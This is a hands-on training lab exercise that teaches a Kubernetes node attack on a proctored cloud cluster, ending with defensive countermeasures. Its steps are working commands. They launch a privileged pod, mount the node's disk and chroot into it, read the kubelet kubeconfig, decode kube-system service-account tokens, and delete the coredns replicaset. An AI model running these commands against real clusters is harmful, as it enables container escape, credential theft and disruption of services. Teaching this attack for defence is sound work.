---
layout: exercise
exercise: 95
title: "Exercise: Kubernetes Node Attacks"
tools: openssh-client kubectl jq curl
directories_to_sync: ssh-config K8S-Exercise
---

## Steps

1. Start a new bash shell

    ```shell
    bash
    ```

1. (*NOTE: You'll only need to do this step if you skipped the [Kubernetes Cloud Attacks](/exercises/cloud-attacks/) exercise*).

    The course proctors will provide you with a cloud cluster ID number (`N`). Store this number in your shell profile in a new variable `CLOUD_ID`, and then read this new variable into your environment now:

    ```shell
    # Replace the "N" in `CLOUD_ID=N` with the ID number provided by the proctors
    echo "export CLOUD_ID=N" >> ~/.bashrc
    source ~/.bashrc
    ```

2. We'll be using the same cloud cluster as in [Kubernetes Cloud Attacks](/exercises/cloud-attacks/), so let's set an `alias`:

    ```shell
    unalias kubectl
    alias kubectl="/root/K8S-Exercise/kubectl \
    --server=$(cat /sync/.cloud_clusters/serverip-$CLOUD_ID ) \
    --token=$(cat /sync/.cloud_clusters/token-cluster-$CLOUD_ID ) \
    --certificate-authority=/sync/.cloud_clusters/ca.crt-$CLOUD_ID"
    ```

3. And test that it works:

    ```shell
    kubectl get pods
    ```

4. Let's launch a privileged pod. Let's ask kubectl to create a manifest for us:

    ```shell
    kubectl run priv --image=bustakube/alpine-small-attack \
      --dry-run=client -o yaml
    ```

5. This outputs the `YAML` for a pod named `priv`, using the image `bustakube/alpine-small-attack` from Docker Hub.  Let's add a field to it, by telling `kubectl` to use JSON output instead, then using `jq` to set a value:

    ```shell
    kubectl run privpod --image=bustakube/alpine-small-attack \
      --dry-run=client -o json \
      | jq '.spec.containers[0].securityContext.privileged=true'
    ```

6. OK, now let's write that to a file:

    ```shell
    kubectl run privpod --image=bustakube/alpine-small-attack \
      --dry-run=client -o json \
     | jq '.spec.containers[0].securityContext.privileged=true' \
      >pod-priv.json
    ```

7. And now let's create the pod with the file:

    ```shell
    kubectl create -f pod-priv.json
    ```

8. Wait for the pod to be ready:

    ```shell
    kubectl wait --for=condition=ready pod/privpod
    ```

9. Exec into your new pod:

    ```shell
    kubectl exec -it privpod -- /bin/bash
    ```

10. This pod is privileged, so it has access to a full set of devices:

    ```shell
    ls /dev
    ```

11. Let's mount the node's root drive - we have skipped trying other partitions and gone straight to the one that applies here:

    ```shell
    mount /dev/sda1 /mnt
    ```

12. Let's copy `kubectl` from our pod into the node's filesystem:

    ```shell
    cp /usr/bin/kubectl /mnt/usr/bin/kubectl
    ```

13. Now `chroot` to the node's filesystem:

    ```shell
    chroot /mnt /bin/bash
    ```

14. You may have received an error message about how the shell (via groups) cannot look up the group ID 11.  That's ok.  It's a normal byproduct of chrooting.  Now that we have access to the host filesystem, let's take a look at the kubelet's directory:

    ```shell
    ls /var/lib/kubelet
    ```

15. There's a `kubeconfig` file, which we can plug right into our `kubectl` command!

    ```shell
    cat /var/lib/kubelet/kubeconfig
    ```

    (On newer versions of Kubernetes, we'll find this file in `/etc/kubernetes/kubelet.conf```)

16. Now let's use it:

    ```shell
    
    
    kubectl --kubeconfig=/var/lib/kubelet/kubeconfig -n kube-system get secrets
    ```

17. To shorten the `kubectl` lines here, let's set an alias:

    ```shell
    alias kubectl="kubectl --kubeconfig=/var/lib/kubelet/kubeconfig"
    ```
    
18. We're listing the secrets from the kube-system namespace, which contains the primary control plane elements for the cluster. Prove to yourself that we can see the contents of secrets:

    ```shell
    kubectl -n kube-system get secrets -o yaml
    ```

19. Now, let's get a significantly-privileged secret's JWT (JSON web token) - first get the token name for the deployment controller:

    ```shell
    secretname=$(kubectl get secrets -n kube-system | \
      awk '{print $1}' | grep deployment-controller)
    ```

    Get the secret:

    ```shell
    kubectl -n kube-system get secret $secretname -o yaml
    ```


20. Store the token in a variable called `secret`:

    ```shell
    secret=$(kubectl -n kube-system get secret $secretname -o yaml  \
    | grep token: | awk '{print $2}' | base64 -d )
    ```

21. To use this token instead of the `kubeconfig` file, we'll need to get an API server IP address and certificate authority file. Start by getting the IP address from your environment variables:

    ```shell
    env | grep KUBERNETES_PORT_443_TCP=
    ```

22. Store that IP address in a variable:

    ```shell
    ip=$(env | grep KUBERNETES_PORT_443_TCP= | awk -F\/ '{print $3}')
    ```

23. Now let's parse the certificate authority's cert out to `/ca.crt`:

    ```shell
    cat /var/lib/kubelet/kubeconfig  |grep  certificate-authority-data | \
      awk '{print $2}' | base64 -d >/ca.crt
    ```

24. Now let's use the token and just run `get pods` to keep things simple and check if it's all working:

    ```shell
    alias kubectl="kubectl --token=$secret --server=https://$ip \
      --certificate-authority=/ca.crt"

    kubectl -n kube-system get pods
    ```

25. We are working with the JWT for the deployment-controller, which manages all pods launched via deployment. Use the token to list deployments:

    ```shell
    kubectl -n kube-system get deployments
    ```

26. If you want to prove to yourself that you really have some serious privilege, let's damage the cluster. Let's see what we are allowed to do:

    ```shell
    kubectl -n kube-system auth can-i --list
    ```

27. Every deployment creates replicasets. We can delete create and delete replicasets in the `kube-system` namespace and, for that matter, in any namespace.  We could delete the replicaset behind `kube-dns`.  Let's get its name:

    ```shell
    kubectl -n kube-system get replicasets
    ```

28. Let's parse that name into a variable:

    ```shell
    rs=$( kubectl -n kube-system get replicasets | awk '{print $1}' | \
      egrep 'coredns-\w+$' )
    ```

29. Now, let's delete that `replicaset` and immediately after get a list of pods:

    ```shell
    kubectl -n kube-system delete replicaset $rs
    kubectl -n kube-system get pods | grep coredns
    ```

30. We see that some pods are terminating, while others are creating to replace them.  This is good - the deployment controller is recreating the destroyed replica set.

31. This attack started with a pod that had a privileged container in it. Our goal in defending will be to prevent anyone from creating privileged containers. We can do this with Pod Security Policies/Standards, but also with third party admission controllers like Open Policy Agent (OPA) Gatekeeper, K-Rail, and Kyverno.
